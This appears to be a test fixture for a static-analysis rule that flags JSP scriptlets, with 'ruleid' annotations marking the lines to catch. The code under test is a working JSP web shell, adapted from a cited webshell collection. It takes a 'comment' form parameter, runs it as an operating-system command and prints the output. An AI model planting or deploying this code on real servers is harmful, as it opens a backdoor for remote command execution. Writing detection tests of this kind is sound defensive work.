<!-- cf. https://github.com/JoyChou93/webshell/blob/4a2f049afe009f9cc061357b002cff78c06d6c43/jsp/cmd.jsp -->
<!-- ok: no-scriptlets -->
<%@ page import="java.util.*,java.io.*"%>
<!-- ruleid: no-scriptlets -->
<% %>
<HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION="">
<INPUT TYPE="text" NAME="comment">
<INPUT TYPE="submit" VALUE="Send">
</FORM> <pre>
<!-- ruleid: no-scriptlets -->
<%
 if ( request.getParameter( "comment" ) != null )
 {
     out.println( "Command: " + request.getParameter( "comment" ) + "<BR>" );
     Process p        = Runtime.getRuntime().exec( request.getParameter( "comment" ) );
     OutputStream os    = p.getOutputStream();
     InputStream in        = p.getInputStream();
     DataInputStream dis    = new DataInputStream( in );
     String disr        = dis.readLine();
     while ( disr != null )
     {
         out.println( disr ); disr = dis.readLine();
     }
 }
 %>
 </pre>
 </BODY></HTML>
